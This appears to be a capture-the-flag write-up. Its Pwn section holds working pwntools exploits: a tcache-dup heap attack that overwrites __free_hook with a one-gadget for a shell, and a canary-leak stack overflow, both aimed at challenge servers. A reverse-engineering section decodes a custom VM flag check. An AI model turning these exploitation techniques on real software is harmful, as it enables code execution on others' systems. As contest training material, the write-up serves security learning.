## Pwn
### easy_heap
    from pwn import *
    context.update(os='linux', arch='amd64')
    def alloc(size = 0, cont = ''):
        p.sendlineafter("which command?\n> ", "1")
        p.sendlineafter("size \n> ", str(size))
        p.sendlineafter("content \n> ", cont)
    def delete(idx):
        p.sendlineafter("which command?\n> ", "2")
        p.sendlineafter("index \n> ", str(idx))
    def show(idx):
        p.sendlineafter("which command?\n> ", "3")
        p.sendlineafter("index \n> ", str(idx))
    def exit():
        p.sendlineafter("which command?\n> ", "4")
    def exploit(p):
        # leak
        for x in range(10):
            alloc()
        for x in [9, 8, 7, 6, 5, 3, 1, 0, 2, 4]:
            delete(x)
        for x in range(8):
            alloc()
        alloc(0xf8) # ID = 2
        alloc() # ID = 0
        for x in [0, 2, 3, 4, 5, 6, 9, 1]:
            delete(x)
        show(8)
        libc.address = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - 0x3ebca0
        oneshot = libc.offset_to_vaddr(0x4f322)
        log.info("libc.address = %s"%hex(libc.address))
        # tcache dup
        for x in range(7):
            alloc()
        alloc(0xf8, 'duplicated')
        # now ID_8 == ID_9, we can do tcache attack
        for x in [1, 2, 3, 4]:
            delete(x)
        delete(8)
        delete(0)
        delete(9)
        alloc(0x8, p64(libc.sym['__free_hook']))
        alloc(0x8, 'id\x00')
        alloc()
        alloc(0x8, p64(oneshot))
        delete(1)
        p.interactive()
    if __name__ == '__main__':
        # p = process('./easy_heap', env={"LD_PRELOAD":"./libc64.so"})
        p = remote("118.25.150.134", 6666)
        libc = ELF("./libc64.so")
        exploit(p)
### just_pwn
    from pwn import *
    context.log_level = 'debug'
    p = process('./just_pwn')
    q = remote('118.25.148.66','2333')
    p.sendlineafter('3.Exit\n','1')
    p.recvline()
    k = p.recvline()
    q.sendlineafter('3.Exit\n','1')
    q.recvline()
    l = q.recvline()
    print k#得到9999的加密结果
    p.close()
    q.sendlineafter('3.Exit\n','2')
    q.sendafter('Enter your secret code please:\n',k)
    def leak(off):
        q.sendlineafter('4.hit on the head of the developer\n------------------------\n','3')
        q.sendlineafter('Confirm? y to confirm\n','y')
        q.sendafter('tell me why do want to buy my software:\n','a'*off)
        q.recvuntil('a'*off)
        leak = u64(q.recvuntil('But I think your reason is not good.\n',drop = True).ljust(8,'\x00'))
        return leak
    q.sendlineafter('4.hit on the head of the developer\n------------------------\n','3')
    q.sendlineafter('Confirm? y to confirm\n','n')
    q.sendlineafter('Confirm? y to confirm\n','n')
    q.sendlineafter('Confirm? y to confirm\n','n')
    q.sendlineafter('Confirm? y to confirm\n','n')
    q.sendlineafter('Confirm? y to confirm\n','n')
    q.sendlineafter('Confirm? y to confirm\n','n')
    q.sendlineafter('Confirm? y to confirm\n','y')
    q.sendlineafter('tell me why do want to buy my software:\n','a'*0x8)
    q.recvuntil('a'*0x8)
    leak = u64(q.recv(8))
    canary = leak - 0xa
    print hex(canary)
    q.sendlineafter('4.hit on the head of the developer\n------------------------\n','3')
    q.sendlineafter('Confirm? y to confirm\n','y')
    q.sendafter('tell me why do want to buy my software:\n','a'*0xc8+p64(canary)+'a'*8+'\x2c\x52')
    q.interactive()
## Re
    r6: input
    // strlen(input) == 0x1c
     0: 95 00 00 00  30 00 00 00  00 00 00 00 1C 00 00 00           mov r3, 0x1c
     1: 97 00 00 00  10 00 00 00                                    mov r1, [r6]
     2: 9B 00 00 00  10 00 00 00                                    cmp r0, r1
     3: 9E 00 00 00  05 00 00 00                                    je  off_7
     4: 94 00 00 00  30 00 00 00                                    dec r3
     5: 99 00 00 00                                                 inc r6
     6: A1 00 00 00  09 00 00 00                                    jmp off_1
     7: 9B 00 00 00  32 00 00 00                                    cmp r2, r3
     8: 9F 00 00 00  04 00 00 00                                    jne off_10
     9: 95 00 00 00  00 00 00 00  00 00 00 00  01 00 00 00          mov r0, 0x1
    10: A3 00 00 00                                                 ret
    // for i=0; i<0x1c; i++
    //    input[i] = (input[i]*0x3f+0x7b)%0x80
     0: 92 00 00 00  00 00 00 00                                    mov eflags, r0;
     1: 9F 00 00 00  01 00 00 00                                    jnz off_2
     2: A3 00 00 00                                                 ret
     3: 95 00 00 00  00 00 00 00  00 00 00 00  80 00 00 00          mov r0, 0x80
     4: 95 00 00 00  20 00 00 00  00 00 00 00  3F 00 00 00          mov r2, 0x3F
     5: 95 00 00 00  30 00 00 00  00 00 00 00  7B 00 00 00          mov r3, 0x7B
     6: 95 00 00 00  40 00 00 00  00 00 00 00  1C 00 00 00          mov eflags, 0x1c
     7: 97 00 00 00  10 00 00 00                                    mov r1, [r6]
     8: 8D 00 00 00  12 00 00 00                                    mul r1, r2
     9: 8B 00 00 00  13 00 00 00                                    add r1, r3
    10: 8F 00 00 00  10 00 00 00                                    mod r1, r0
    11: 98 00 00 00  10 00 00 00                                    mov [r6], r1
    12: 99 00 00 00                                                 inc r6
    13: 94 00 00 00  40 00 00 00                                    dec eflags
    14: 87 00 00 00  40 00 00 00                                    push eflags
    15: 92 00 00 00  40 00 00 00                                    mov eflags, eflags
    16: 9F 00 00 00  01 00 00 00                                    jnz off_18
    17: A3 00 00 00                                                 ret
    18: 8A 00 00 00  40 00 00 00                                    pop eflags
    19: A1 00 00 00  16 00 00 00                                    jmp off_7
    20: A3 00 00 00                                                 ret
    21: 00 00 00 00                                                 nop
    22: 00 00 00 00                                                 nop
    // [0x3e,0x1a,0x56,0x0d,0x52,0x13,0x58,0x5,0x6e,0x5c,0xf,0x5,0x46,0x7,0x9,0x52,0x2,0x5,0x4c,0xa,0xa,0x56,0x33,0x40,0x15,0x07,0x58,0xf][::-1]
     0: 92 00 00 00  00 00 00 00                                    mov eflags, r0;
     1: 9F 00 00 00  01 00 00 00                                    jnz off_3
     2: A3 00 00 00                                                 ret
     3: 86 00 00 00  00 00 00 00  3E 00 00 00                       push 0x3e
     4: 86 00 00 00  00 00 00 00  1A 00 00 00                       push 0x1a
     5: 86 00 00 00  00 00 00 00  56 00 00 00                       push 0x56
     6: 86 00 00 00  00 00 00 00  0D 00 00 00                       push 0x0d
     7: 86 00 00 00  00 00 00 00  52 00 00 00                       push 0x52
     8: 86 00 00 00  00 00 00 00  13 00 00 00                       push 0x13
     9: 86 00 00 00  00 00 00 00  58 00 00 00                       push 0x58
    10: 86 00 00 00  00 00 00 00  5A 00 00 00                       push 0x5a
    11: 86 00 00 00  00 00 00 00  6E 00 00 00                       push 0x6e
    12: 86 00 00 00  00 00 00 00  5C 00 00 00                       push 0x5c
    13: 86 00 00 00  00 00 00 00  0F 00 00 00                       push 0xf
    14: 86 00 00 00  00 00 00 00  5A 00 00 00                       push 0x5a
    15: 86 00 00 00  00 00 00 00  46 00 00 00                       push 0x46
    16: 86 00 00 00  00 00 00 00  07 00 00 00                       push 0x7
    17: 86 00 00 00  00 00 00 00  09 00 00 00                       push 0x9
    18: 86 00 00 00  00 00 00 00  52 00 00 00                       push 0x52
    19: 86 00 00 00  00 00 00 00  25 00 00 00                       push 0x25
    20: 86 00 00 00  00 00 00 00  5C 00 00 00                       push 0x5c
    21: 86 00 00 00  00 00 00 00  4C 00 00 00                       push 0x4c
    22: 86 00 00 00  00 00 00 00  0A 00 00 00                       push 0xa
    23: 86 00 00 00  00 00 00 00  0A 00 00 00                       push 0xa
    24: 86 00 00 00  00 00 00 00  56 00 00 00                       push 0x56
    25: 86 00 00 00  00 00 00 00  33 00 00 00                       push 0x33
    26: 86 00 00 00  00 00 00 00  40 00 00 00                       push 0x40
    27: 86 00 00 00  00 00 00 00  15 00 00 00                       push 0x15
    28: 86 00 00 00  00 00 00 00  07 00 00 00                       push 0x07
    29: 86 00 00 00  00 00 00 00  58 00 00 00                       push 0x58
    30: 86 00 00 00  00 00 00 00  0F 00 00 00                       push 0xf
    31: 95 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00          mov r0, 0x0
    32: 95 00 00 00  30 00 00 00  00 00 00 00  1C 00 00 00          mov r3, 0x1c
    33: 97 00 00 00  10 00 00 00                                    mov r1, [r6]
    34: 8A 00 00 00  20 00 00 00                                    pop r2
    35: 9B 00 00 00  12 00 00 00                                    cmp r1, r2
    36: 9E 00 00 00  01 00 00 00                                    jz  off_38
    37: A3 00 00 00                                                 ret
    38: 99 00 00 00                                                 inc r6
    39: 94 00 00 00  30 00 00 00                                    dec r3
    40: 92 00 00 00  30 00 00 00                                    mov eflags, r3
    41: 9F 00 00 00  05 00 00 00                                    jnz off_5
    42: 95 00 00 00  00 00 00 00  00 00 00 00  01 00 00 00          mov r0, 1
    43: A3 00 00 00                                                 ret
    44: A1 00 00 00 15 00 00 00
    enc_flag = [0x3e,0x1a,0x56,0x0d,0x52,0x13,0x58,0x5a,0x6e,0x5c,0x0f,0x5a,0x46,0x07,0x09,0x52,0x25,0x5c,0x4c,0x0a,0x0a,0x56,0x33,0x40,0x15,0x07,0x58,0x0f][::-1]
    def encode(x):
        return (x*0x3f+0x7b)%0x80
    def crack(target):
        ret = []
        for x in range(256):
            if encode(x) == target:
                ret.append(x)
        return ret
    def gen_flag():
        flag = ''.join([chr(crack(x)[0]) for x in enc_flag])
        return flag
    if __name__ == '__main__':
        print gen_flag()
## Misc
### 签到题
### 问卷
有点难，`goo.gl`网站打不开。